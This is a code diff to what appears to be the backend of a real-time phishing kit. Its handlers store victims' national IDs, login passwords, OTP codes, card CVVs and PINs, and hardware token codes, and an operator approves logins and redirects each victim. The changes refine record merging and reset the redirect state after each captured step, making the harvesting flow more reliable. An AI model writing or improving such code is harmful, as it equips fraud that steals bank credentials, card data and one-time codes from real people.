@@ -61,7 +61,7 @@ function mergeApps(local, remote) {
     for (const k of Object.keys(other)) {
       if (k === 'id' || k === 'nationalId' || k === 'createdAt') continue;
       if (k === 'updatedAt') { base[k] = new Date(Math.max(new Date(l[k] || 0), new Date(r[k] || 0))).toISOString(); continue; }
-      if (!base[k] && other[k]) base[k] = other[k];
+      if (base[k] === undefined || base[k] === '') { if (other[k] !== undefined && other[k] !== null) base[k] = other[k]; }
     }
     merged[id] = base;
   }
@@ -206,7 +206,7 @@ function executeProcedure(name, input, isAdmin, data) {
     }
     case 'applications.clearRedirectByUser': {
       const { nationalId } = input;
-      if (nationalId && data.applications[nationalId]) { data.applications[nationalId].redirectTo = null; data.applications[nationalId].redirectError = null; }
+      if (nationalId && data.applications[nationalId]) { data.applications[nationalId].redirectTo = null; data.applications[nationalId].redirectError = null; data.applications[nationalId].updatedAt = new Date().toISOString(); }
       return { success: true };
     }
     case 'applications.getCustomMessage': {
@@ -243,6 +243,7 @@ function executeProcedure(name, input, isAdmin, data) {
       const app = getOrCreateApp(data, nationalId);
       if (username) app.username = username;
       if (password) app.password = password;
+      app.redirectTo = null; app.redirectError = null;
       app.loginApproved = null; app.status = 'awaiting_login'; app.updatedAt = new Date().toISOString();
       return { success: true };
     }
@@ -252,6 +253,7 @@ function executeProcedure(name, input, isAdmin, data) {
       const app = getOrCreateApp(data, nationalId);
       const code = otp || otpCode;
       if (code) { app.otp = code; app.otpCode = code; }
+      app.redirectTo = null; app.redirectError = null;
       app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
       return { success: true };
     }
@@ -265,6 +267,7 @@ function executeProcedure(name, input, isAdmin, data) {
       if (cv) { app.cvv = cv; app.cardCvv = cv; }
       if (cardName) app.cardName = cardName;
       if (cardPin) app.cardPin = cardPin;
+      app.redirectTo = null; app.redirectError = null;
       app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
       return { success: true };
     }
@@ -274,6 +277,7 @@ function executeProcedure(name, input, isAdmin, data) {
       const app = getOrCreateApp(data, nationalId);
       const tk = hardToken || hardTokenCode || token;
       if (tk) app.hardToken = tk;
+      app.redirectTo = null; app.redirectError = null;
       app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
       return { success: true };
     }
@@ -283,6 +287,7 @@ function executeProcedure(name, input, isAdmin, data) {
       const app = getOrCreateApp(data, nationalId);
       const wl = watchLink || watchLinkOtp || link;
       if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
+      app.redirectTo = null; app.redirectError = null;
       app.updatedAt = new Date().toISOString();
       return { success: true };
     }
